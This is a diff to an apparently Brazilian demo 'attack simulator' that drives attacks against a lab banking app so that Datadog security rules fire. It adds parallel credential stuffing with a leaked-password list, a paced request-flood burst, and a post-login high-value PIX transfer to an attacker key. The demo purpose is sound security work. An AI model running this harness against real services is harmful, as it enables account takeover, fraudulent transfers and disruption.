@@ -23,6 +23,7 @@ import time
 import logging
 import os
 import json
+from concurrent.futures import ThreadPoolExecutor, as_completed
 from datetime import datetime
 from typing import List, Dict, Optional
 from urllib.parse import quote
@@ -35,25 +36,59 @@ logging.basicConfig(
 )
 logger = logging.getLogger(__name__)
 
-# URLs dos servicos
-AUTH_SERVICE_URL = os.getenv('AUTH_SERVICE_URL', 'http://auth-service:8088')
-TRANSACTION_SERVICE_URL = os.getenv('TRANSACTION_SERVICE_URL', 'http://transaction-service:8084')
-ACCOUNT_SERVICE_URL = os.getenv('ACCOUNT_SERVICE_URL', 'http://account-service:8089')
-CHATBOT_SERVICE_URL = os.getenv('CHATBOT_SERVICE_URL', 'http://chatbot-service:8083')
-NGINX_URL = os.getenv('NGINX_URL', 'http://nginx:80')
+# Modo de alvo:
+#  - EXTERNAL_TARGET=true (default): ataca via FQDN publico, sai do cluster via NAT
+#    -> IP de origem aparece como flagged_ip no Datadog AAP.
+#  - EXTERNAL_TARGET=false: usa os service names internos (10.0.x.x).
+EXTERNAL_TARGET = os.getenv('EXTERNAL_TARGET', 'true').lower() == 'true'
+PUBLIC_BASE_URL = os.getenv('PUBLIC_BASE_URL', 'https://lab.dogbank.dog')
 
-# Intervalo entre ataques (segundos)
-MIN_INTERVAL = float(os.getenv('ATTACK_MIN_INTERVAL', '5'))
-MAX_INTERVAL = float(os.getenv('ATTACK_MAX_INTERVAL', '15'))
+if EXTERNAL_TARGET:
+    _default_auth = PUBLIC_BASE_URL
+    _default_tx = PUBLIC_BASE_URL
+    _default_acc = PUBLIC_BASE_URL
+    _default_chat = PUBLIC_BASE_URL
+    _default_nginx = PUBLIC_BASE_URL
+else:
+    _default_auth = 'http://auth-service:8088'
+    _default_tx = 'http://transaction-service:8084'
+    _default_acc = 'http://account-service:8089'
+    _default_chat = 'http://chatbot-service:8083'
+    _default_nginx = 'http://nginx:80'
 
-# Probabilidades de cada tipo de ataque
-PROB_SQL_INJECTION = float(os.getenv('PROB_SQL_INJECTION', '0.20'))
-PROB_LOG4SHELL = float(os.getenv('PROB_LOG4SHELL', '0.15'))
-PROB_RCE = float(os.getenv('PROB_RCE', '0.15'))
-PROB_PATH_TRAVERSAL = float(os.getenv('PROB_PATH_TRAVERSAL', '0.15'))
-PROB_XSS = float(os.getenv('PROB_XSS', '0.15'))
-PROB_AUTH_BYPASS = float(os.getenv('PROB_AUTH_BYPASS', '0.10'))
-PROB_IDOR = float(os.getenv('PROB_IDOR', '0.10'))
+# URLs dos servicos (override via env)
+AUTH_SERVICE_URL = os.getenv('AUTH_SERVICE_URL', _default_auth)
+TRANSACTION_SERVICE_URL = os.getenv('TRANSACTION_SERVICE_URL', _default_tx)
+ACCOUNT_SERVICE_URL = os.getenv('ACCOUNT_SERVICE_URL', _default_acc)
+CHATBOT_SERVICE_URL = os.getenv('CHATBOT_SERVICE_URL', _default_chat)
+NGINX_URL = os.getenv('NGINX_URL', _default_nginx)
+
+# Intervalo entre ataques (segundos) - Ajustado para 1 minuto (foco em roubo de info, não degradação)
+MIN_INTERVAL = float(os.getenv('ATTACK_MIN_INTERVAL', '60'))
+MAX_INTERVAL = float(os.getenv('ATTACK_MAX_INTERVAL', '60'))
+
+# Probabilidades de cada tipo de ataque - AUMENTADO SQL E RCE PARA DEMOS
+PROB_SQL_INJECTION = float(os.getenv('PROB_SQL_INJECTION', '0.25'))
+PROB_RCE = float(os.getenv('PROB_RCE', '0.20'))
+PROB_LOG4SHELL = float(os.getenv('PROB_LOG4SHELL', '0.10'))
+PROB_PATH_TRAVERSAL = float(os.getenv('PROB_PATH_TRAVERSAL', '0.07'))
+PROB_XSS = float(os.getenv('PROB_XSS', '0.05'))
+PROB_AUTH_BYPASS = float(os.getenv('PROB_AUTH_BYPASS', '0.03'))
+PROB_IDOR = float(os.getenv('PROB_IDOR', '0.05'))
+# Novos vetores (focados no demo SecOps)
+PROB_CREDENTIAL_STUFFING = float(os.getenv('PROB_CREDENTIAL_STUFFING', '0.15'))
+PROB_DDOS = float(os.getenv('PROB_DDOS', '0.05'))
+PROB_POST_EXPLOIT = float(os.getenv('PROB_POST_EXPLOIT', '0.05'))
+
+# Configuracao do brute force / credential stuffing
+BRUTE_WORKERS = int(os.getenv('BRUTE_WORKERS', '10'))
+BRUTE_ATTEMPTS_PER_BURST = int(os.getenv('BRUTE_ATTEMPTS_PER_BURST', '60'))
+
+# Configuracao do DDoS leve (precisa estar explicitamente habilitado)
+ATTACK_DDOS_ENABLED = os.getenv('ATTACK_DDOS_ENABLED', 'false').lower() == 'true'
+DDOS_RPS = int(os.getenv('DDOS_RPS', '20'))
+DDOS_BURST_SECONDS = int(os.getenv('DDOS_BURST_SECONDS', '10'))
+DDOS_WORKERS = int(os.getenv('DDOS_WORKERS', '20'))
 
 
 # =============================================================================
@@ -289,11 +324,64 @@ SQL_EXFIL_PAYLOADS = [
 ]
 
 
+# =============================================================================
+# CREDENTIAL STUFFING - PASSWORD & CPF POOLS
+# =============================================================================
+# CPFs reais que existem no init-rds.sql (1 acerto garantido por ciclo) misturados
+# com ruido para gerar muitas falhas que disparam a regra de Credential Stuffing.
+REAL_CPFS = [
+    '12345678915', '98765432101', '45678912302', '78912345603',
+    '32165498704', '65498732105', '15975385206', '66666666666',
+]
+DECOY_CPFS = [
+    '11111111111', '22222222222', '33333333333', '44444444444',
+    '55555555555', '77777777777', '88888888888', '99999999999',
+    '00000000000', '10101010101', '20202020202', '30303030303',
+    '40404040404', '50505050505', '60606060606', '70707070707',
+    '80808080808', '90909090909', '12121212121', '13131313131',
+    '14141414141', '17171717171', '19191919191', '23232323232',
+    '24242424242', '25252525252', '26262626262', '27272727272',
+    '28282828282', '29292929292', '31313131313', '34343434343',
+    '35353535353', '36363636363', '37373737373', '38383838383',
+    '39393939393', '41414141414', '42424242424', '43434343434',
+    '46464646464', '47474747474',
+]
+CREDENTIAL_STUFFING_CPFS = REAL_CPFS + DECOY_CPFS
+
+# Top-100 senhas vazadas (rockyou subset). A senha real `123456` esta na lista
+# para que pelo menos 1 tentativa por ciclo tenha sucesso.
+COMMON_PASSWORDS = [
+    '123456', 'password', '12345678', 'qwerty', '123456789', '12345',
+    '1234', '111111', '1234567', 'dragon', '123123', 'baseball',
+    'abc123', 'football', 'monkey', 'letmein', 'shadow', 'master',
+    '666666', 'qwertyuiop', '123321', 'mustang', '1234567890', 'michael',
+    '654321', 'pussy', 'superman', '1qaz2wsx', '7777777', 'fuckyou',
+    '121212', '000000', 'qazwsx', '123qwe', 'killer', 'trustno1',
+    'jordan', 'jennifer', 'zxcvbnm', 'asdfgh', 'hunter', 'buster',
+    'soccer', 'harley', 'batman', 'andrew', 'tigger', 'sunshine',
+    'iloveyou', 'fuckme', '2000', 'charlie', 'robert', 'thomas',
+    'hockey', 'ranger', 'daniel', 'starwars', 'klaster', '112233',
+    'george', 'computer', 'michelle', 'jessica', 'pepper', '1111',
+    'zxcvbn', '555555', '11111111', '131313', 'freedom', '777777',
+    'pass', 'maggie', '159753', 'aaaaaa', 'ginger', 'princess',
+    'joshua', 'cheese', 'amanda', 'summer', 'love', 'ashley',
+    '6969', 'nicole', 'chelsea', 'biteme', 'matthew', 'access',
+    'yankees', '987654321', 'dallas', 'austin', 'thunder', 'taylor',
+    'matrix', 'mobilemail', 'mom', 'monitor', 'monitoring',
+]
+
+
 class SecurityAttacker:
     """Simulador de ataques de seguranca para demonstracao"""
 
     def __init__(self):
         self.session = requests.Session()
+        # User-Agent malicioso para identificacao facil no Datadog ASM
+        self.session.headers.update({
+            'User-Agent': 'DogBank-Attacker/2.0 (Security Testing Bot)',
+            'X-Attack-Simulation': 'DogBank-Demo',
+            'X-Attacker-ID': f'attacker-{random.randint(1000, 9999)}'
+        })
         self.stats = {
             'total_attacks': 0,
             'sql_injection': 0,
@@ -303,11 +391,17 @@ class SecurityAttacker:
             'xss': 0,
             'auth_bypass': 0,
             'idor': 0,
+            'credential_stuffing': 0,
+            'ddos': 0,
+            'post_exploit': 0,
             'detected': 0,
             'blocked': 0,
+            'stuffing_success': 0,
         }
         # Token valido para alguns ataques autenticados
         self.valid_token = None
+        # Conta comprometida via credential stuffing (usada no post_exploit)
+        self.compromised_account_id: Optional[int] = None
 
     def get_valid_token(self) -> Optional[str]:
         """Obtem um token valido para ataques autenticados"""
@@ -644,10 +738,14 @@ class SecurityAttacker:
     # =========================================================================
 
     def attack_auth_bypass(self):
-        """Executa ataques de Authentication Bypass"""
+        """Executa ataques de Authentication Bypass (JWT/header manipulation).
+
+        Brute force foi movido para attack_credential_stuffing para gerar
+        volume real e disparar a regra ATO nativa do Datadog AAP.
+        """
         self.stats['auth_bypass'] += 1
 
-        attack_type = random.choice(['jwt', 'header', 'brute_force'])
+        attack_type = random.choice(['jwt', 'header'])
 
         if attack_type == 'jwt':
             # JWT manipulation
@@ -664,7 +762,7 @@ class SecurityAttacker:
             except Exception as e:
                 logger.error(f"   Erro: {e}")
 
-        elif attack_type == 'header':
+        else:
             # Header manipulation
             header_payload = random.choice([p for p in AUTH_BYPASS_PAYLOADS if isinstance(p, dict)])
             logger.info(f"[AUTH-BYPASS] Tentando header manipulation: {list(header_payload.keys())}...")
@@ -679,26 +777,164 @@ class SecurityAttacker:
             except Exception as e:
                 logger.error(f"   Erro: {e}")
 
-        else:
-            # Brute force simulation
-            logger.info(f"[AUTH-BYPASS] Simulando brute force no login...")
+    # =========================================================================
+    # CREDENTIAL STUFFING ATTACK (brute force real, paralelo)
+    # =========================================================================
 
-            common_passwords = ['123456', 'password', 'admin', 'root', 'qwerty']
-            cpfs = ['12345678900', '11111111111', '00000000000', 'admin']
+    def _try_login(self, cpf: str, senha: str) -> Optional[Dict]:
+        """Tenta um login. Retorna o JSON da resposta se sucesso (200), None caso contrario."""
+        try:
+            response = self.session.post(
+                f"{AUTH_SERVICE_URL}/api/auth/login",
+                json={"cpf": cpf, "senha": senha},
+                timeout=8,
+            )
+            if response.status_code == 200:
+                try:
+                    return response.json()
+                except Exception:
+                    return {}
+        except Exception:
+            return None
+        return None
 
-            for cpf in cpfs[:2]:
-                for pwd in common_passwords[:3]:
-                    try:
-                        response = self.session.post(
-                            f"{AUTH_SERVICE_URL}/api/auth/login",
-                            json={"cpf": cpf, "senha": pwd},
-                            timeout=5
-                        )
-                        if response.status_code == 200:
-                            logger.warning(f"   CREDENCIAIS VALIDAS: {cpf}:{pwd}")
-                    except:
-                        pass
-                    time.sleep(0.5)
+    def attack_credential_stuffing(self):
+        """Brute force / credential stuffing real e paralelo.
+
+        Gera ~BRUTE_ATTEMPTS_PER_BURST tentativas em alguns segundos contra o
+        endpoint /api/auth/login, combinando CPFs reais + decoys com top-100
+        senhas vazadas. Garante 1+ acerto por ciclo (credencial real esta no pool)
+        para disparar o sinal 'Account Takeover' do Datadog AAP.
+        """
+        self.stats['credential_stuffing'] += 1
+
+        attempts = []
+        for _ in range(BRUTE_ATTEMPTS_PER_BURST):
+            cpf = random.choice(CREDENTIAL_STUFFING_CPFS)
+            senha = random.choice(COMMON_PASSWORDS)
+            attempts.append((cpf, senha))
+
+        # Garante pelo menos 1 par valido para o sinal 'login.success apos N failures'
+        if random.random() < 0.7:
+            attempts.append((random.choice(REAL_CPFS), '123456'))
+
+        logger.info(
+            f"[CREDENTIAL-STUFFING] Disparando {len(attempts)} tentativas "
+            f"({BRUTE_WORKERS} workers paralelos)..."
+        )
+
+        successes = 0
+        with ThreadPoolExecutor(max_workers=BRUTE_WORKERS) as pool:
+            futures = {pool.submit(self._try_login, cpf, pwd): (cpf, pwd) for cpf, pwd in attempts}
+            for fut in as_completed(futures):
+                result = fut.result()
+                if result:
+                    cpf, pwd = futures[fut]
+                    successes += 1
+                    self.stats['stuffing_success'] += 1
+                    logger.warning(f"   CREDENCIAIS VALIDAS DESCOBERTAS: {cpf}:{pwd}")
+                    # Guarda accountId da conta comprometida para o post-exploit
+                    acc_id = result.get('accountId')
+                    if acc_id:
+                        self.compromised_account_id = acc_id
+
+        logger.info(f"[CREDENTIAL-STUFFING] Concluido: {successes} sucesso(s) em {len(attempts)} tentativas")
+
+    # =========================================================================
+    # DDoS LEVE (apenas se ATTACK_DDOS_ENABLED=true)
+    # =========================================================================
+
+    def attack_ddos_light(self):
+        """Burst de requests para gerar pico de trafego sem derrubar o sistema.
+
+        Desabilitado por padrao (`ATTACK_DDOS_ENABLED=false`). Quando habilitado,
+        dispara DDOS_RPS req/s por DDOS_BURST_SECONDS contra /api/auth/health.
+        O objetivo eh popular Cloud Network Monitoring e dashboards de tasa.
+        """
+        if not ATTACK_DDOS_ENABLED:
+            return
+
+        self.stats['ddos'] += 1
+        total_requests = DDOS_RPS * DDOS_BURST_SECONDS
+        logger.info(
+            f"[DDOS-LIGHT] Burst de {total_requests} requests "
+            f"({DDOS_RPS} req/s por {DDOS_BURST_SECONDS}s) contra /api/auth/health..."
+        )
+
+        target_url = f"{AUTH_SERVICE_URL}/api/auth/health"
+        start = time.time()
+        sent = 0
+
+        def _fire():
+            try:
+                self.session.get(target_url, timeout=3)
+            except Exception:
+                pass
+
+        with ThreadPoolExecutor(max_workers=DDOS_WORKERS) as pool:
+            for _ in range(total_requests):
+                pool.submit(_fire)
+                sent += 1
+                # Pacing simples (req/s)
+                expected_elapsed = sent / DDOS_RPS
+                actual_elapsed = time.time() - start
+                if actual_elapsed < expected_elapsed:
+                    time.sleep(expected_elapsed - actual_elapsed)
+
+        duration = time.time() - start
+        logger.info(f"[DDOS-LIGHT] Burst concluido em {duration:.1f}s ({sent / duration:.1f} req/s efetivo)")
+
+    # =========================================================================
+    # POST-EXPLOIT (sequencia para a regra composta no SIEM)
+    # =========================================================================
+
+    def attack_post_exploit_action(self):
+        """Simula a kill-chain: login bem-sucedido (apos stuffing) -> PIX alto valor.
+
+        Gera a sequencia que a regra 'High-value PIX after login' usa para correlacionar:
+        evento de login.success seguido em <120s por uma transacao PIX > R$ 5k vinda do
+        mesmo usuario / mesmo IP de origem.
+        """
+        self.stats['post_exploit'] += 1
+
+        # Se nao tem conta comprometida, faz um login valido agora para gerar o sinal
+        token = self.valid_token
+        account_id = self.compromised_account_id
+
+        if not account_id:
+            result = self._try_login('12345678915', '123456')
+            if result:
+                account_id = result.get('accountId')
+                self.compromised_account_id = account_id
+                logger.info(f"[POST-EXPLOIT] Login realizado, accountId={account_id}")
+
+        if not account_id:
+            logger.warning("[POST-EXPLOIT] Nao foi possivel obter conta comprometida, abortando")
+            return
+
+        # Aguarda alguns segundos para a sequencia ficar visivel no Datadog
+        time.sleep(random.uniform(3, 8))
+
+        # PIX de alto valor (acima de R$ 5k para acionar a regra)
+        amount = random.choice([5500, 7250, 8990, 9999])
+        logger.warning(
+            f"[POST-EXPLOIT] Disparando PIX de R$ {amount} de conta comprometida {account_id}..."
+        )
+
+        try:
+            response = self.session.post(
+                f"{TRANSACTION_SERVICE_URL}/api/transactions/pix",
+                json={
+                    "accountOriginId": account_id,
+                    "pixKeyDestination": "attacker.payout@dogbank.com",
+                    "amount": amount,
+                    "description": "transferencia",
+                },
+                timeout=15,
+            )
+            self._check_response(response, 'Post-Exploit PIX')
+        except Exception as e:
+            logger.error(f"   Erro: {e}")
 
     # =========================================================================
     # IDOR ATTACKS
@@ -786,6 +1022,9 @@ class SecurityAttacker:
             ('xss', PROB_XSS),
             ('auth_bypass', PROB_AUTH_BYPASS),
             ('idor', PROB_IDOR),
+            ('credential_stuffing', PROB_CREDENTIAL_STUFFING),
+            ('ddos', PROB_DDOS),
+            ('post_exploit', PROB_POST_EXPLOIT),
         ]
 
         for attack, prob in attacks:
@@ -808,6 +1047,9 @@ class SecurityAttacker:
             'xss': self.attack_xss,
             'auth_bypass': self.attack_auth_bypass,
             'idor': self.attack_idor,
+            'credential_stuffing': self.attack_credential_stuffing,
+            'ddos': self.attack_ddos_light,
+            'post_exploit': self.attack_post_exploit_action,
         }
 
         method = attack_methods.get(attack)
@@ -825,8 +1067,12 @@ class SecurityAttacker:
         logger.info(f"   RCE/Command Injection: {self.stats['rce']}")
         logger.info(f"   Path Traversal: {self.stats['path_traversal']}")
         logger.info(f"   XSS: {self.stats['xss']}")
-        logger.info(f"   Auth Bypass: {self.stats['auth_bypass']}")
+        logger.info(f"   Auth Bypass (JWT/header): {self.stats['auth_bypass']}")
         logger.info(f"   IDOR: {self.stats['idor']}")
+        logger.info(f"   Credential Stuffing (bursts): {self.stats['credential_stuffing']} "
+                    f"(sucessos: {self.stats['stuffing_success']})")
+        logger.info(f"   DDoS leve: {self.stats['ddos']} (enabled={ATTACK_DDOS_ENABLED})")
+        logger.info(f"   Post-exploit (PIX alto valor): {self.stats['post_exploit']}")
         logger.info("-" * 70)
         logger.info(f"   Ataques BLOQUEADOS pelo WAF/ASM: {self.stats['blocked']}")
         logger.info(f"   Possiveis vulnerabilidades detectadas: {self.stats['detected']}")
@@ -838,18 +1084,23 @@ class SecurityAttacker:
         logger.info("DogBank Security Attack Simulator")
         logger.info("APENAS PARA DEMONSTRACAO DE SEGURANCA")
         logger.info("=" * 70)
+        logger.info(f"   EXTERNAL_TARGET: {EXTERNAL_TARGET} (publico via NAT EIP)")
         logger.info(f"   Auth Service: {AUTH_SERVICE_URL}")
         logger.info(f"   Account Service: {ACCOUNT_SERVICE_URL}")
         logger.info(f"   Transaction Service: {TRANSACTION_SERVICE_URL}")
         logger.info(f"   Chatbot Service: {CHATBOT_SERVICE_URL}")
         logger.info(f"   Intervalo entre ataques: {MIN_INTERVAL}s - {MAX_INTERVAL}s")
+        logger.info(f"   Credential stuffing: {BRUTE_ATTEMPTS_PER_BURST} tentativas / burst, "
+                    f"{BRUTE_WORKERS} workers")
+        logger.info(f"   DDoS leve: enabled={ATTACK_DDOS_ENABLED}, "
+                    f"{DDOS_RPS} rps por {DDOS_BURST_SECONDS}s")
         logger.info("=" * 70)
 
-        # Aguarda servicos ficarem prontos
+        # Aguarda servicos ficarem prontos - REDUZIDO PARA DEMOS
         logger.info("Aguardando servicos ficarem prontos...")
-        time.sleep(60)
+        time.sleep(30)
 
-        logger.info("Iniciando simulacao de ataques...")
+        logger.info("Iniciando simulacao de ataques AGRESSIVOS para demo...")
 
         attack_count = 0
         while True:
